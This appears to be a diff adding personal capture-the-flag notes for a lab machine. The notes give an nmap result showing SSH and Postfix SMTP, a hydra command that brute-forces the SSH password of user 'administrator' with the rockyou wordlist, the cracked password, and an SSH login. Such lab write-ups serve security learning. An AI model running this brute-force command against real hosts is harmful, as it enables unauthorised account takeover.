@@ -1,0 +1,22 @@
+Target Machine IPv4 address: 10.10.215.152
+--------------------------------------------------
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+25/tcp open  smtp    syn-ack Postfix smtpd
+|_smtp-commands: polosmtp.home, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
+--------------------------------------------------
+
+# Metasploit finds username 'administrator'
+
+hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt.gz -vV 10.10.215.152 ssh
+
+
+# [22][ssh] host: 10.10.215.152   login: administrator   password: alejandro
+# PASSWORD: alejandro
+# Try login to ssh
+ssh administrator@10.10.215.152
+
+# FLAG: :
+
+
+
